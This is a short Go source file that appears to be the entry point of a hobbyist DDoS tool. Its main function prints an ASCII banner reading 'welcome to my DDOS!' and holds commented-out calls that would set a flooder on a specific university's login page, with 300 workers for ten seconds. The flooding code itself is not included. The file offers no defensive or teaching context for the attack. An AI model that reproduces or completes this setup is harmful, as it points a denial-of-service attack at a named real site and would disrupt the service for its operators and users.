package main

import (
	"fmt"
)

func main() {
	printIntro()

	// x := ddos.NewFlooder("https://ava-grad.unifacef.com.br/login/index.php", 10)
	// x.SetWorkerAmount(300)
	// x.SetDuration(10)
	// x.Flood()
}

func printIntro() {
	fmt.Println(`.----------------.  .----------------.  .----------------. `)
	fmt.Println(`| .--------------. || .--------------. || .--------------. |`)
	fmt.Println(`| |  _______     | || | ____    ____ | || |  _______     | |`)
	fmt.Println(`| | |_   __ \    | || ||_   \  /   _|| || | |_   __ \    | |`)
	fmt.Println(`| |   | |__) |   | || |  |   \/   |  | || |   | |__) |   | |`)
	fmt.Println(`| |   |  __ /    | || |  | |\  /| |  | || |   |  __ /    | |`)
	fmt.Println(`| |  _| |  \ \_  | || | _| |_\/_| |_ | || |  _| |  \ \_  | |`)
	fmt.Println(`| | |____| |___| | || ||_____||_____|| || | |____| |___| | |`)
	fmt.Println(`| |              | || |              | || |              | |`)
	fmt.Println(`| '--------------' || '--------------' || '--------------' |`)
	fmt.Println(` '----------------'  '----------------'  '----------------' `)
	fmt.Println("     Hello, My name is Rodolfo, and welcome to my DDOS!")
}
